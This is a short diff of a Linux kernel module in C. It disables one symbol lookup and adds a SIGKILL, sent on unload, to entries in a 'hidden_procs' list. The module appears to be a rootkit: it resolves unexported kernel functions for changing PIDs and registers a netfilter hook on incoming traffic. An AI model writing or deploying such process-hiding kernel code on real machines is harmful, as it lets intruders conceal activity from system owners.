@@ -593,11 +593,13 @@ static int __init mod_init(void) {
 
     change_pidR = kallsyms_lookup_name("change_pid");
     alloc_pidR = kallsyms_lookup_name("alloc_pid");
+#if 0
     my_release_task_stack = kallsyms_lookup_name("release_task_stack");
     if (!my_release_task_stack) {
         printk(KERN_ALERT "Unable to find task stack symbol\n");
         return -1;
     }
+#endif
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
@@ -689,6 +691,7 @@ static void __exit mod_exit(void) {
 
         //Decrement the refcount to reset pid struct
         put_pid(hidden_procs[i].p);
+        force_sig(SIGKILL, hidden_procs[i].ts);
 #endif
     }
 
